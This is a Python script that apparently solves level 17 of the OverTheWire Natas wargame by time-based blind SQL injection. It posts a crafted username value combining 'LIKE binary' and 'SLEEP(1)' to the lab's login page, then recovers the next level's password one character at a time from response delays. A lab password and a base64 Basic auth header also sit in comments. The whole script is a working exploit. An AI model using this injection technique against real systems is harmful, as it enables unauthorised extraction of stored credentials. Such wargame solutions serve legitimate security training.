import requests
import string
from requests.auth import HTTPBasicAuth

#Password is xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP


def solve17(username, password):
    session = requests.session()
    #session.headers["Authorization"] = "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
    session.auth = HTTPBasicAuth(username, password)
    session.headers["content-type"] = "application/x-www-form-urlencoded"
    def getURL():
        return f"http://natas17.natas.labs.overthewire.org/index.php"


    possibleLetters = string.ascii_letters + "0123456789"
    lettersContained = ""
    for letter in possibleLetters:
        resp = session.post(getURL(), data=f'username=natas18" AND password LIKE binary "%{letter}%" AND SLEEP(1); #')
        if resp.elapsed.seconds >= 1:
            lettersContained += letter

    password = ""
    letterAdded = True
    while letterAdded:
        letterAdded = False
        for letter in lettersContained:
            resp = session.post(getURL(), data=f'username=natas18" AND password LIKE binary "{password}{letter}%" AND SLEEP(1); #')
            if resp.elapsed.seconds >= 1:
                letterAdded = True
                password += letter
                print(letter, end="")
                break
    return password
